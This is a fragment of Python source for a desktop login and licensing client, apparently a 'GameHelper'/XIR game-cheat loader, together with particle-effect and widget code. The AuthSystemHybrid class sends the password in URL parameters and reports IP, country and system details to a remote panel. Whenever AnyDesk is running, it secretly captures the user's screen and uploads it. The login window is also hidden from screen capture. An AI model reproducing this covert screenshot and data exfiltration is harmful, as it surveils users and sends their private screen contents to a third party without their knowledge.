                'size': random.uniform(5, 15),
                'color': '#666666',
                'type': 'smoke'
            }
        elif particle_type == 'fire':
            particle = {
                'x': x,
                'y': y,
                'vx': random.uniform(-1, 1),
                'vy': random.uniform(-3, -1),
                'life': 1.0,
                'decay': random.uniform(0.03, 0.06),
                'size': random.uniform(3, 8),
                'color': random.choice(['#ff0000', '#ff6600', '#ff9900']),
                'type': 'fire'
            }
        else:
            return None
        
        self.particles.append(particle)
        return particle
    
    def update_particles(self):
        current_time = time.time()
        
        for emitter in self.emitters:
            if current_time - emitter['last_emission'] > (1000 / emitter['rate']):
                self.create_particle(emitter['x'], emitter['y'], emitter['type'])
                emitter['last_emission'] = current_time
        
        for particle in self.particles[:]:
            particle['x'] += particle['vx']
            particle['y'] += particle['vy']
            
            particle['vy'] += self.gravity
            particle['vx'] += self.wind
            
            particle['life'] -= particle['decay']
            
            if particle['life'] <= 0:
                self.particles.remove(particle)
    
    def draw_particles(self):
        self.canvas.delete("particle")
        
        for particle in self.particles:
            alpha = particle['life']
            size = particle['size'] * alpha
            
            if particle['type'] == 'sparkle':
                x, y = particle['x'], particle['y']
                color = particle['color']
                
                self.canvas.create_oval(
                    x - size/2, y - size/2, x + size/2, y + size/2,
                    fill=color, outline=color, tags="particle"
                )
                
                glow_size = size * 2
                self.canvas.create_oval(
                    x - glow_size/2, y - glow_size/2, x + glow_size/2, y + glow_size/2,
                    fill='', outline=color, width=1, tags="particle"
                )
            
            elif particle['type'] == 'smoke':
                x, y = particle['x'], particle['y']
                color = particle['color']
                
                self.canvas.create_oval(
                    x - size/2, y - size/2, x + size/2, y + size/2,
                    fill=color, outline=color, tags="particle"
                )
            
            elif particle['type'] == 'fire':
                x, y = particle['x'], particle['y']
                color = particle['color']
                
                self.canvas.create_oval(
                    x - size/2, y - size/2, x + size/2, y + size/2,
                    fill=color, outline=color, tags="particle"
                )
    
    def start(self):
        self.is_running = True
        self.update()
    
    def stop(self):
        self.is_running = False
        self.particles.clear()
        self.emitters.clear()
        self.canvas.delete("particle")
    
    def update(self):
        if not self.is_running:
            return
        
        self.update_particles()
        self.draw_particles()
        
        self.canvas.after(16, self.update)

        time.sleep(15)

class AuthSystemHybrid:
    def __init__(self, username, password):
        self.username = username
        self.password = password
        self.panel_url = "Masonbacinisikim.com"
        self.license_file = "license.dat"
        self.auth_data = {}
        self.hwid = self.get_hwid()

        try:
            print("[INFO] Checking panel availability...")
            if self.is_panel_available():
                print("[INFO] Panel online. Attempting online login...")
                self.pull_data_from_cloud()
                print("[INFO] Online login successful.")
                self.send_client_log("login_success", "User logged in successfully (online)")
                atexit.register(self.log_program_exit)
                threading.Thread(target=self.ping_server, daemon=True).start()
                threading.Thread(target=self.license_auto_updater, daemon=True).start()
                threading.Thread(target=self.notification_listener, daemon=True).start()
                threading.Thread(target=self.anydesk_monitor, daemon=True).start()
            else:
                print("[WARNING] Panel unreachable. Trying offline login...")
                try:
                    self.load_offline_license()
                    print("[INFO] Offline login successful.")
                    self.send_client_log("offline_login_success", "User logged in successfully (offline)")
                    threading.Thread(target=self.anydesk_monitor, daemon=True).start()
                except Exception as e:
                    print(f"[ERROR] Offline login failed: {str(e)}")
                    self.send_client_log("offline_login_failed", f"Offline license error: {str(e)}")
                    raise e
        except Exception as e:
            print(f"[ERROR] Login failed: {str(e)}")
            self.send_client_log("login_failed", f"Login failed: {str(e)}")
            raise e

    def ping_server(self):
        while True:
            try:
                if hasattr(self, 'username') and self.username:
                    response = requests.post(
                        f"{self.panel_url}/client_ping",
                        json={"username": self.username},
                        headers={"User-Agent": "GameHelper-Auth/1.0"},
                        timeout=5
                    )
                    if response.status_code == 200:
                        print(f"[PING] Server pinged successfully")
                    else:
                        print(f"[PING] Server ping failed: {response.status_code}")
                time.sleep(60)
            except Exception as e:
                print(f"[PING] Error: {e}")
                time.sleep(60)

    def is_panel_available(self):
        for attempt in range(3):
            try:
                print(f"[DEBUG] Panel check attempt {attempt + 1}/3")
                print(f"[DEBUG] URL: {self.panel_url}/ping")
            
                headers = {"User-Agent": "XIR-Auth/1.0"}
                response = requests.get(
                    f"{self.panel_url}/ping", 
                    timeout=10,
                    headers=headers,
                    verify=True
                )
            
                print(f"[DEBUG] Response status: {response.status_code}")
                print(f"[DEBUG] Response content: {response.text}")
                
                if response.status_code == 200:
                    print(f"[DEBUG] Panel is available!")
                    return True
                
            except requests.exceptions.Timeout as e:
                print(f"[DEBUG] Timeout error: {e}")
            except requests.exceptions.ConnectionError as e:
                print(f"[DEBUG] Connection error: {e}")
            except requests.exceptions.RequestException as e:
                print(f"[DEBUG] Request error: {e}")
            except Exception as e:
                print(f"[DEBUG] Unexpected error: {e}")
                
            if attempt < 2:
                print(f"[DEBUG] Waiting 2 seconds before retry...")
                time.sleep(2)
    
        print(f"[DEBUG] All attempts failed")
        return False

    def get_hwid(self):
        try:
            result = subprocess.check_output(
                'wmic csproduct get uuid', shell=True).decode().split('\n')[1].strip()
            return hashlib.sha256(result.encode('utf-8')).hexdigest()
        except Exception:
            return "unknown"

    def parse_datetime_safely(self, date_string):
        try:
            if 'T' in date_string and ('+' in date_string or '-' in date_string[-6:]):
                dt = datetime.datetime.fromisoformat(date_string.replace('Z', '+00:00'))
                return dt.replace(tzinfo=None)
            else:
                dt = datetime.datetime.fromisoformat(date_string)
                return dt
        except Exception:
            try:
                return datetime.datetime.strptime(date_string, "%Y-%m-%d")
            except Exception:
                return datetime.datetime(1970, 1, 1)

    def pull_data_from_cloud(self):
        self.auth_data = {}
        try:
            headers = {"User-Agent": "XIR-Auth/1.0"}
            try:
                res = requests.get(f"{self.panel_url}/get_user_data", params={
                    "username": self.username,
                    "password": self.password
                }, headers=headers, timeout=10)
            except requests.exceptions.RequestException:
                raise Exception("Please wait, server is waking up. Try again in a few seconds...")

            if res.status_code == 200:
                user_data = res.json()
                if not user_data.get("status"):
                    raise Exception(user_data.get("message", "The username or password is incorrect."))
                if user_data.get("hwid"):
                    if user_data["hwid"] != self.hwid:
                        self.send_client_log("hwid_mismatch", f"Expected HWID: {user_data['hwid']}, Current HWID: {self.hwid}")
                        raise Exception("HWID mismatch.")
                if user_data.get("banned", False):
                    self.send_client_log("banned", "User is banned (online)")
                    raise Exception("This account has been banned.")

                expiry = self.parse_datetime_safely(user_data.get("expiry_date", "1970-01-01"))
                if expiry < datetime.datetime.now():
                    self.send_client_log("license_expired", "License expired (online)")
                    raise Exception("License expired.")

                self.auth_data = user_data
                with open(self.license_file, "w") as f:
                    json.dump(user_data, f, indent=4)

                try:
                    ip = requests.get("https://api.ipify.org", timeout=3).text
                    country = requests.get("https://ipinfo.io/json", timeout=3).json().get("country", "Unknown")
                    sysinf = platform.system() + " " + platform.release()
                    requests.post(
                        f"{self.panel_url}/log_login",
                        json={"username": self.username, "ip": ip, "country": country, "system": sysinf},
                        headers=headers, timeout=5
                    )
                except:
                    pass

            else:
                try:
                    err = res.json().get("message", f"HTTP {res.status_code}")
                except Exception:
                    err = f"Could not connect to the server. (HTTP {res.status_code})"
                raise Exception(err)

        except Exception as e:
            raise Exception(str(e))

    def load_offline_license(self):
        if not os.path.exists(self.license_file):
            raise Exception("License file not found.")

        with open(self.license_file, "r") as f:
            self.auth_data = json.load(f)

        if self.auth_data.get("username") != self.username:
            raise Exception("Offline license mismatch.")

        if self.auth_data.get("hwid"):
            if self.auth_data.get("hwid") != self.hwid:
                self.send_client_log("hwid_mismatch_offline", f"Expected HWID: {self.auth_data.get('hwid')}, Current HWID: {self.hwid}")
                raise Exception("HWID mismatch in offline mode.")

        if self.is_panel_available():
            raise Exception("Panel is online, offline license cannot be used. Please connect to the internet.")

        if self.auth_data.get("banned", False):
            self.send_client_log("banned", "User is banned (offline)")
            raise Exception("This account has been banned (offline mode).")

        expiry = self.parse_datetime_safely(self.auth_data.get("expiry_date", "1970-01-01"))
        if expiry < datetime.datetime.now():
            self.send_client_log("license_expired", "License expired (offline)")
            raise Exception("The offline license has expired.")

    def license_auto_updater(self):
        while True:
            try:
                if self.is_panel_available():
                    self.pull_data_from_cloud()
            except Exception as e:
                print(f"[License AutoUpdater] {e}")
            time.sleep(300)

    def log_program_exit(self):
        try:
            self.send_client_log("exit", "User closed the program")
            requests.post(f"{self.panel_url}/log_program_exit", json={"username": self.username}, timeout=3)
        except:
            pass

    def notification_listener(self):
        last_message = ""
        while True:
            try:
                res = requests.get(f"{self.panel_url}/get_user_notification", params={"username": self.username}, timeout=5)
                if res.status_code == 200:
                    data = res.json()
                    message = data.get("message")
                    if message and message != last_message:
                        last_message = message
            except Exception:
                pass
            time.sleep(10)

    def send_client_log(self, action, detail):
        try:
            data = {
                "username": self.username,
                "action": action,
                "detail": detail,
            }
            requests.post(
                f"{self.panel_url}/api/client_log",
                data=data,
                timeout=5
            )
        except Exception as e:
            print(f"[ClientLog] Log could not be sent: {e}")

    def send_screenshot_to_panel(self, action, detail):
        try:
            img = ImageGrab.grab()
            buf = io.BytesIO()
            img.save(buf, format='PNG')
            buf.seek(0)
            try:
                data = {
                    "username": self.username,
                    "action": action,
                    "detail": detail,
                }
                files = {'screenshot': ('screenshot.png', buf, 'image/png')}
                requests.post(
                    f"{self.panel_url}/api/client_log",
                    data=data,
                    files=files,
                    timeout=5
                )
            except Exception as e:
                print(f"[ClientLog] Screenshot could not be sent: {e}")
            finally:
                buf.close()
        except Exception as e:
            print(f"[ERROR] Screenshot error: {e}")

    def is_anydesk_running(self):
        for proc in psutil.process_iter(['name']):
            if proc.info['name'] and 'anydesk' in proc.info['name'].lower():
                return True
        return False

    def anydesk_monitor(self):
        while True:
            if self.is_anydesk_running():
                self.send_screenshot_to_panel("anydesk_screenshot", "Screenshot taken while Anydesk is running")
                time.sleep(60)
            else:
                time.sleep(10)

    def is_authenticated(self):
        return bool(self.auth_data)

    @property
    def license_type(self):
        return self.auth_data.get("license_type", "Unknown")

    @property
    def expiry_date(self):
        return self.auth_data.get("expiry_date", "Unknown")

    @property
    def is_banned(self):
        return self.auth_data.get("banned", False)

    @property
    def registered_username(self):
        return self.auth_data.get("username", "Unknown")

    @staticmethod
    def authenticate_gui(login_button, username_entry, password_entry, app_instance, on_success, on_failure):
        user = username_entry.get()
        pwd = password_entry.get()
        
        try:
            login_button.configure(state="disabled")
            auth = AuthSystemHybrid(user, pwd)
            if auth.is_authenticated():
                app_instance.auth = auth
                on_success(user)
            else:
                on_failure("Authentication failed.")
        except Exception as e:
            on_failure(str(e))
        finally:
            if login_button.winfo_exists():
                login_button.configure(state="normal")

class FloatingLabelEntry(ctk.CTkFrame):
    def __init__(self, master, label="", placeholder="", icon=None, show=None, **kwargs):
        super().__init__(master, fg_color="transparent")
        
        self.label_text = label
        self.placeholder_text = placeholder
        self.show_char = show
        self.has_focus = False
        self.has_value = False
        
        self.height = kwargs.pop("height", 50)
        self.width = kwargs.pop("width", 350)
        
        self.border_color = kwargs.pop("border_color", "#333333")
        self.fg_color = kwargs.pop("fg_color", "#222222")
        self.text_color = kwargs.pop("text_color", "#ffffff")
        self.placeholder_color = "#888888"
        self.label_color = "#888888"
        self.focused_label_color = PRIMARY_COLOR
        
        self.configure(width=self.width, height=self.height)
        
        self.bg_frame = ctk.CTkFrame(
            self, 
            fg_color=self.fg_color,
            corner_radius=10,
            border_width=2,
            border_color=self.border_color,
            width=self.width,
            height=self.height
        )
        self.bg_frame.place(x=0, y=0, relwidth=1, relheight=1)
        
        self.icon = None
        if icon:
            self.icon = ctk.CTkLabel(
                self.bg_frame, 
                text=icon, 
                font=("Segoe UI", 16), 
                text_color="#888888",
                width=30
            )
            self.icon.place(x=10, y=self.height/2, anchor="w")
        
        entry_x = 45 if icon else 10
        self.label = ctk.CTkLabel(
            self.bg_frame,
            text=self.label_text,
            font=("Segoe UI", 12),
            text_color=self.label_color,
            fg_color="transparent"
        )
        
        self.label.place(x=entry_x, y=self.height/2, anchor="w")
        
        self.entry_var = tk.StringVar()
        self.entry = tk.Entry(
            self.bg_frame,
            textvariable=self.entry_var,
            font=("Segoe UI", 14),
            bd=0,
            bg=self.fg_color,
            fg=self.text_color,
            insertbackground=self.text_color,
            highlightthickness=0,
            show=self.show_char
        )
        
        self.entry.place(
            x=entry_x, 
            y=self.height/2, 
            width=self.width-entry_x-10, 
            height=self.height-20,
            anchor="w"
        )
        
        self.entry.bind("<FocusIn>", self.on_focus_in)
        self.entry.bind("<FocusOut>", self.on_focus_out)
        self.entry.bind("<KeyRelease>", self.on_key_release)
        
        if self.placeholder_text:
            self.entry.insert(0, self.placeholder_text)
            self.entry.config(fg=self.placeholder_color)
    
    def on_focus_in(self, event=None):
        self.has_focus = True
        self.animate_label_to_top()
        self.bg_frame.configure(border_color=self.focused_label_color)
        
        if self.entry_var.get() == self.placeholder_text:
            self.entry_var.set("")
            self.entry.config(fg=self.text_color)
            if self.show_char:
                self.entry.config(show=self.show_char)
    
    def on_focus_out(self, event=None):
        self.has_focus = False
        self.animate_label_to_center()
        self.bg_frame.configure(border_color=self.border_color)
        
        if not self.entry_var.get() or self.entry_var.get() == self.placeholder_text:
            self.entry_var.set(self.placeholder_text)
            self.entry.config(fg=self.placeholder_color)
            if self.show_char:
                self.entry.config(show="")
    
    def on_key_release(self, event=None):
        current_value = self.entry_var.get()
        if current_value and current_value != self.placeholder_text:
            self.has_value = True
        else:
            self.has_value = False
    
    def animate_label_to_top(self):
        target_y = 15
        current_y = self.height/2
        
        def animate_step(current_step=0, total_steps=8):
            if current_step < total_steps:
                progress = current_step / total_steps
                progress = 1 - (1 - progress) * (1 - progress)
                
                new_y = current_y - (current_y - target_y) * progress
                self.label.place(x=self.label.winfo_x(), y=int(new_y))

                r1, g1, b1 = self.hex_to_rgb(self.label_color)
                r2, g2, b2 = self.hex_to_rgb(self.focused_label_color)
                
                r = int(r1 + (r2 - r1) * progress)
                g = int(g1 + (g2 - g1) * progress)
                b = int(b1 + (b2 - b1) * progress)
                
                self.label.configure(text_color=f"#{r:02x}{g:02x}{b:02x}")
                
                self.entry.after(16, lambda: animate_step(current_step + 1, total_steps))
        
        animate_step()
    
    def animate_label_to_center(self):
        if self.has_value:
            return  
        
        target_y = self.height/2
        current_y = 15
        
        def animate_step(current_step=0, total_steps=8):
            if current_step < total_steps:
                progress = current_step / total_steps
                progress = 1 - (1 - progress) * (1 - progress)
                
                new_y = current_y + (target_y - current_y) * progress
                self.label.place(x=self.label.winfo_x(), y=int(new_y))
                
                r1, g1, b1 = self.hex_to_rgb(self.focused_label_color)
                r2, g2, b2 = self.hex_to_rgb(self.label_color)
                
                r = int(r1 + (r2 - r1) * progress)
                g = int(g1 + (g2 - g1) * progress)
                b = int(b1 + (b2 - b1) * progress)
                
                self.label.configure(text_color=f"#{r:02x}{g:02x}{b:02x}")
                
                self.entry.after(16, lambda: animate_step(current_step + 1, total_steps))
        
        animate_step()
    
    def hex_to_rgb(self, hex_color):
        hex_color = hex_color.lstrip('#')
        return tuple(int(hex_color[i:i+2], 16) for i in (0, 2, 4))
    
    def get(self):
        value = self.entry_var.get()
        if value == self.placeholder_text:
            return ""
        return value
        
    def set(self, value):
        if not value:
            if not self.has_focus:
                self.entry_var.set(self.placeholder_text)
                self.entry.config(fg=self.placeholder_color)
            else:
                self.entry_var.set("")
        else:
            self.entry_var.set(value)
            self.entry.config(fg=self.text_color)
            self.has_value = True
            self.animate_label_to_top()

class IconEntry(ctk.CTkFrame):
    def __init__(self, master, placeholder="", icon=None, show=None, **kwargs):
        super().__init__(master, fg_color="transparent")
        
        self.placeholder_text = placeholder
        self.show_char = show
        self.has_focus = False
        
        self.height = kwargs.pop("height", 50)
        self.width = kwargs.pop("width", 350)
        
        self.border_color = kwargs.pop("border_color", "#333333")
        self.fg_color = kwargs.pop("fg_color", "#222222")
        self.text_color = kwargs.pop("text_color", "#ffffff")
        self.placeholder_color = "#888888"
        
        self.configure(width=self.width, height=self.height)
        
        self.bg_frame = ctk.CTkFrame(
            self, 
            fg_color=self.fg_color,
            corner_radius=10,
            border_width=2,
            border_color=self.border_color,
            width=self.width,
            height=self.height
        )
        self.bg_frame.place(x=0, y=0, relwidth=1, relheight=1)
        
        self.icon = None
        if icon:
            self.icon = ctk.CTkLabel(
                self.bg_frame, 
                text=icon, 
                font=("Segoe UI", 16), 
                text_color="#888888",
                width=30
            )
            self.icon.place(x=10, y=self.height/2, anchor="w")
            
        self.entry_var = tk.StringVar()
        entry_x = 45 if icon else 10
        
        self.entry = tk.Entry(
            self.bg_frame,
            textvariable=self.entry_var,
            font=("Segoe UI", 14),
            bd=0,
            bg=self.fg_color,
            fg=self.text_color,
            insertbackground=self.text_color,
            highlightthickness=0,
            show=self.show_char
        )
        
        self.entry.place(
            x=entry_x, 
            y=self.height/2, 
            width=self.width-entry_x-10, 
            height=self.height-20,
            anchor="w"
        )
        
        if self.placeholder_text:
            self.show_placeholder()
            
        self.entry.bind("<FocusIn>", self.on_focus_in)
        self.entry.bind("<FocusOut>", self.on_focus_out)
        
    def on_focus_in(self, event=None):
        self.has_focus = True
        if self.entry_var.get() == self.placeholder_text:
            self.entry.config(fg=self.text_color)
            self.entry_var.set("")
            if self.show_char:
                self.entry.config(show=self.show_char)
    
    def on_focus_out(self, event=None):
        self.has_focus = False
        if not self.entry_var.get():
            self.show_placeholder()
    
    def show_placeholder(self):
        self.entry.config(fg=self.placeholder_color)
        if self.show_char:
            self.entry.config(show="")
        self.entry_var.set(self.placeholder_text)
    
    def get(self):
        value = self.entry_var.get()
        if value == self.placeholder_text:
            return ""
        return value
        
    def set(self, value):
        if not value:
            if not self.has_focus:
                self.show_placeholder()
            else:
                self.entry_var.set("")
        else:
            self.entry.config(fg=self.text_color)
            if self.show_char:
                self.entry.config(show=self.show_char)
            self.entry_var.set(value)
            
    def focus(self):
        self.entry.focus_set()

class ModernButton(ctk.CTkButton):
    def __init__(self, *args, **kwargs):
        self.hover_animation_running = False
        super().__init__(*args, **kwargs)
        self.default_fg = self.cget("fg_color")
        self.hover_fg = kwargs.get("hover_color", PRIMARY_COLOR)
        
        self.shadow_canvas = None
        self.animation_id = None
        
        self.bind("<Enter>", self.on_enter)
        self.bind("<Leave>", self.on_leave)
        
        self.bind("<Button-1>", self.on_press)
        self.bind("<ButtonRelease-1>", self.on_release)
        
        self.after(10, self.create_shadow)
        
        theme_manager.register_widget(self, {
            'fg_color': 'accent_primary',
            'hover_color': 'accent_secondary',
            'text_color': 'text_primary'
        })
    
    def create_shadow(self):
        if self.winfo_exists():
            parent = self.master
            self.shadow_canvas = ctk.CTkCanvas(parent, 
                                             width=self.winfo_width()+24, 
                                             height=self.winfo_height()+24,
                                             bg="#1c1c1e", highlightthickness=0)
            self.shadow_canvas.place(x=self.winfo_x()-12, y=self.winfo_y()-12)
            
            self.shadow_canvas.create_rectangle(6, 6, self.winfo_width()+18, self.winfo_height()+18, 
                                              fill="#1c1c1e", outline="", tags="shadow")
            self.shadow_canvas.create_rectangle(5, 5, self.winfo_width()+19, self.winfo_height()+19, 
                                              fill="", outline="#333333", tags="shadow")
            
            self.lift()
    
    def update_shadow_position(self):
        if self.shadow_canvas and self.shadow_canvas.winfo_exists():
            self.shadow_canvas.place(x=self.winfo_x()-12, y=self.winfo_y()-12)
            self.lift()
    
    def on_enter(self, event=None):
        if self.hover_animation_running:
            return
        self.hover_animation_running = True
        
        if self.animation_id:
            self.after_cancel(self.animation_id)
        
        if self.shadow_canvas:
            self.animate_shadow_color('#1c1c1e', '#333333', steps=20)
        
        
        self.animate_color(self.cget("fg_color"), self.hover_fg, steps=25)
    
    def on_leave(self, event=None):
        if self.hover_animation_running:
            return
        self.hover_animation_running = True
        
        if self.animation_id:
            self.after_cancel(self.animation_id)
        
        if self.shadow_canvas:
            self.animate_shadow_color('#333333', '#1c1c1e', steps=20)
        
        
        self.animate_color(self.cget("fg_color"), self.default_fg, steps=25)
    
    def on_press(self, event=None):
        if self.animation_id:
            self.after_cancel(self.animation_id)
        
        self.configure(border_width=2)
        
        if self.shadow_canvas and self.shadow_canvas.winfo_exists():
            self.shadow_canvas.itemconfigure("shadow", fill="#1c1c1e", outline="#222222")
    
    def on_release(self, event=None):
        if self.animation_id:
            self.after_cancel(self.animation_id)
        
        self.configure(border_width=0)
        
        if self.shadow_canvas and self.shadow_canvas.winfo_exists():
            self.shadow_canvas.itemconfigure("shadow", fill="#1c1c1e", outline="#333333")
    
    def animate_color(self, start_color, end_color, step=0, steps=25):
        if not self.winfo_exists():
            self.hover_animation_running = False
            return
        
        if step > steps:
            self.hover_animation_running = False
            return
        
        def hex_to_rgb(hex_color):
            hex_color = hex_color.lstrip('#')
            return tuple(int(hex_color[i:i+2], 16) for i in (0, 2, 4))
        
        def rgb_to_hex(rgb):
            return f"#{rgb[0]:02x}{rgb[1]:02x}{rgb[2]:02x}"
        
        if isinstance(start_color, tuple):
            start_color = start_color[0]
        if isinstance(end_color, tuple):
            end_color = end_color[0]
        
        start_rgb = hex_to_rgb(start_color)
        end_rgb = hex_to_rgb(end_color)
        
        progress = step / steps
        eased_progress = 3 * progress * progress - 2 * progress * progress * progress
        
        current_rgb = tuple(
            int(start_rgb[i] + (end_rgb[i] - start_rgb[i]) * eased_progress)
            for i in range(3)
        )
        
        current_color = rgb_to_hex(current_rgb)
        self.configure(fg_color=current_color)
        
        self.after(20, lambda: self.animate_color(start_color, end_color, step+1, steps))
    
    def animate_shadow_color(self, start_color, end_color, step=0, steps=20):
        if not self.winfo_exists() or not self.shadow_canvas or not self.shadow_canvas.winfo_exists():
            return
        
        if step > steps:
            return
        
        def hex_to_rgb(hex_color):
            hex_color = hex_color.lstrip('#')
            return tuple(int(hex_color[i:i+2], 16) for i in (0, 2, 4))
        
        def rgb_to_hex(rgb):
            return f"#{rgb[0]:02x}{rgb[1]:02x}{rgb[2]:02x}"
        
        start_rgb = hex_to_rgb(start_color)
        end_rgb = hex_to_rgb(end_color)
        
        progress = step / steps
        eased_progress = 3 * progress * progress - 2 * progress * progress * progress
        
        current_rgb = tuple(
            int(start_rgb[i] + (end_rgb[i] - start_rgb[i]) * eased_progress)
            for i in range(3)
        )
        
        current_color = rgb_to_hex(current_rgb)
        
        try:
            self.shadow_canvas.configure(bg=current_color)
        except:
            pass
        
        self.after(25, lambda: self.animate_shadow_color(start_color, end_color, step+1, steps))
    
    def animate_scale(self, start_scale, end_scale, duration=300, easing='ease_in_out'):

        try:
            start_width = int(self.winfo_width() * start_scale)
            start_height = int(self.winfo_height() * start_scale)
            end_width = int(self.winfo_width() * end_scale)
            end_height = int(self.winfo_height() * end_scale)
            
            self.animation_id = animation_engine.animate_property(
                self, 'width', start_width, end_width, duration, easing
            )
            
            animation_engine.animate_property(
                self, 'height', start_height, end_height, duration, easing
            )
        except:
            pass

class LoginWindow:
    login_attempts = 0
    last_attempt_time = 0
    lockout_time = 0
    max_attempts = 5
    
    def __init__(self, root, on_login_success):
        self.root = root
        self.on_login_success = on_login_success
        self.auth = None
        self.is_loading = False
        
        self.screen_width = root.winfo_screenwidth()
        self.screen_height = root.winfo_screenheight()
        
        self.window = ctk.CTkToplevel(root)
        self.window.title("XIR Authentication")
        self.window.geometry(f"{self.screen_width}x{self.screen_height}+0+0")
        self.window.attributes("-topmost", True)
        self.window.overrideredirect(True)  
        self.window.protocol("WM_DELETE_WINDOW", self.on_close)
        self.window.grab_set()
        
        set_window_icon(self.window)
        
        self.bg_color = "#000000"  
        self.card_color = "#1a1a1a"
        self.accent_color = "#2563eb"
        self.text_color = "#ffffff"
        self.secondary_text = "#9ca3af"
        self.border_color = "#374151"
        
        self.spinner_canvas = None
        self.spinner_arc = None
        self.spinner_angle = 0
        self.spinner_after_id = None
        self.is_spinner_running = False
        
        self.window.configure(fg_color=self.bg_color)
        self.window.attributes("-alpha", 0.95)  
        
        self.create_fullscreen_ui()
        
        self.window.after(200, lambda: enable_stream_proof(self.window))
        
    def create_fullscreen_ui(self):
        overlay = ctk.CTkFrame(self.window, fg_color=self.bg_color, corner_radius=0)
        overlay.place(x=0, y=0, relwidth=1, relheight=1)
        
        close_btn = ctk.CTkButton(
            overlay,
            text="✕",
            width=35,
            height=35,
            corner_radius=0,
            fg_color="transparent",
            hover_color="#ef4444",
            text_color=self.text_color,
            font=ctk.CTkFont(size=18, weight="bold"),
            border_width=0,
            command=self.on_close
        )
        close_btn.place(x=self.screen_width-60, y=20)
        
        widget_width = 800
        widget_height = 220
        widget_x = (self.screen_width - widget_width) // 2
        widget_y = (self.screen_height - widget_height) // 2
        
        login_widget = ctk.CTkFrame(
            overlay,
            width=widget_width,
            height=widget_height,
            fg_color=self.card_color,
            corner_radius=16,
            border_width=1,
            border_color="#ffffff"
        )
        login_widget.place(x=widget_x, y=widget_y)
        
        self.title_canvas = ctk.CTkCanvas(
            login_widget,
            width=120,
            height=50,
            bg="#1a1a1a",
            highlightthickness=0
        )
        self.title_canvas.place(x=40, y=65)
        
        self.create_gradient_text()
        
        subtitle_label = ctk.CTkLabel(
            login_widget,
            text="Setup Assistant",
            font=ctk.CTkFont(family="Calibri", size=11, weight="bold"),
            text_color=self.secondary_text
        )
        subtitle_label.place(x=100, y=125, anchor="center")
        
        separator_frame = ctk.CTkFrame(
            login_widget,
            width=2,
            height=140,
            fg_color="#333333",
            corner_radius=1
        )
        separator_frame.place(x=180, y=40)
        
        form_x_start = 200
        form_y_start = 40
        
        username_label = ctk.CTkLabel(
            login_widget,
            text="Username",
            font=ctk.CTkFont(family="Segoe UI", size=12, weight="normal"),
            text_color="#cccccc",
            anchor="w"
        )
        username_label.place(x=form_x_start, y=form_y_start)
        
        self.username_entry = ctk.CTkEntry(
            login_widget,
            placeholder_text="Enter username",
            width=180,
            height=36,
            font=ctk.CTkFont(family="Segoe UI", size=13, weight="normal"),
            fg_color="#1e1e1e",
            border_color="#404040",
            text_color=self.text_color,
            placeholder_text_color="#666666",
            corner_radius=4,
            border_width=1
        )
        self.username_entry.place(x=form_x_start, y=form_y_start + 25)
        
        self.username_hover_job = None
        def username_hover_enter(e):
            self.animate_entry_border(self.username_entry, "#404040", "#666666")
        def username_hover_leave(e):
            self.animate_entry_border(self.username_entry, "#666666", "#404040")
        
        self.username_entry.bind("<Enter>", username_hover_enter)
        self.username_entry.bind("<Leave>", username_hover_leave)
        
        password_label = ctk.CTkLabel(
            login_widget,
            text="Password",
            font=ctk.CTkFont(family="Segoe UI", size=12, weight="normal"),
            text_color="#cccccc",
            anchor="w"
        )
        password_label.place(x=form_x_start + 200, y=form_y_start)
        
        self.password_entry = ctk.CTkEntry(
            login_widget,
            placeholder_text="Enter password",
            width=180,
            height=36,
            font=ctk.CTkFont(family="Segoe UI", size=13, weight="normal"),
            fg_color="#1e1e1e",
            border_color="#404040",
            text_color=self.text_color,
            placeholder_text_color="#666666",
            corner_radius=4,
            border_width=1,
            show="●"
        )
        self.password_entry.place(x=form_x_start + 200, y=form_y_start + 25)
        
        self.password_hover_job = None
        def password_hover_enter(e):
            self.animate_entry_border(self.password_entry, "#404040", "#666666")
        def password_hover_leave(e):
            self.animate_entry_border(self.password_entry, "#666666", "#404040")
        
        self.password_entry.bind("<Enter>", password_hover_enter)
        self.password_entry.bind("<Leave>", password_hover_leave)
        
        self.button_canvas = ctk.CTkCanvas(
            login_widget,
            width=380,
            height=40,
            bg="#1a1a1a",
            highlightthickness=0
        )
        self.button_canvas.place(x=form_x_start, y=form_y_start + 90)
        
        self.button_bg = self.button_canvas.create_rectangle(
            1, 1, 379, 39,
            fill="#1a1a1a",
            outline="#333333",
            width=2
        )
        
        self.button_fill = self.button_canvas.create_rectangle(
            2, 2, 2, 38,
            fill="#ffffff",
            outline=""
        )
        
        self.button_text = self.button_canvas.create_text(
            190, 20,
            text="LOGIN",
            font=("Calibri", 14, "bold"),
            fill="#ffffff",
            anchor="center"
        )
        
        self.button_canvas.bind("<Button-1>", lambda e: self.login())
        self.button_canvas.bind("<Enter>", self.button_hover_enter)
        self.button_canvas.bind("<Leave>", self.button_hover_leave)

        self.button_fill_width = 0
        self.button_animation_job = None
        
        self.status_label = ctk.CTkLabel(
            login_widget,
            text="",
            font=ctk.CTkFont(family="Calibri", size=11, weight="bold"),
            text_color="#ef4444"
        )
        self.status_label.place(x=form_x_start + 190, y=form_y_start + 160, anchor="center")
        
        self.signup_link = ctk.CTkLabel(
            login_widget,
            text="Don't have an account? Sign up",
            font=ctk.CTkFont(family="Calibri", size=10, weight="normal"),
            text_color="#ffffff",
            cursor="hand2"
        )
        self.signup_link.place(x=form_x_start + 190, y=form_y_start + 145, anchor="center")
        
        self.signup_link.bind("<Button-1>", self.open_signup_link)
        self.signup_link.bind("<Enter>", self.on_signup_link_hover)
        self.signup_link.bind("<Leave>", self.on_signup_link_leave)
        
        try:
            nier_path = get_resource_path("nier.png")
            
            if nier_path and os.path.exists(nier_path):
                print(f"[DEBUG] Found nier.png at: {nier_path}")
                try:
                    nier_image = Image.open(nier_path)
                    print(f"[DEBUG] Successfully loaded nier.png, size: {nier_image.size}")
                    
                    max_height = widget_height - 40  
                    max_width = 150  
                    
                    img_width, img_height = nier_image.size
                    if img_height > max_height:
                        ratio = max_height / img_height
                        new_width = int(img_width * ratio)
                        new_height = max_height
                        if new_width > max_width:
                            ratio = max_width / new_width
                            new_width = max_width
                            new_height = int(new_height * ratio)
                    else:
                        new_width = min(img_width, max_width)
                        new_height = img_height
                    
                    print(f"[DEBUG] Resizing nier.png to: {new_width}x{new_height}")
                    nier_image = nier_image.resize((new_width, new_height), Image.Resampling.LANCZOS)
                    nier_ctk_image = CTkImage(light_image=nier_image, dark_image=nier_image, size=(new_width, new_height))
                    
                    nier_x_pos = widget_width - new_width - 50  
                    nier_label = ctk.CTkLabel(
                        login_widget,
                        image=nier_ctk_image,
                        text="",
                        fg_color="transparent"
                    )
